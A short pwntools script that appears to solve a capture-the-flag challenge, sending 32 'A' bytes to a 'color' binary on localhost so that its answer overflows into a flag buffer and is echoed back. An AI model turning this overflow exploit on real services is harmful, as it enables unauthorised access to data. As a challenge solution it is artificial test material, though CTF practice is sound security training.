#!/usr/bin/env python3

from pwn import *

exe = ELF("./color")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("localhost", 5000)

    return r

def main():
    r = conn()

    r.recvuntil(b"What's your favorite color? ")
    payload = b'A' * 0x20 # send just enough characters to overflow into the flag buffer
    r.sendline(payload)
    r.recvuntil(payload) # wait for our answer to be echoed back to us
    r.interactive()


if __name__ == "__main__":
    main()
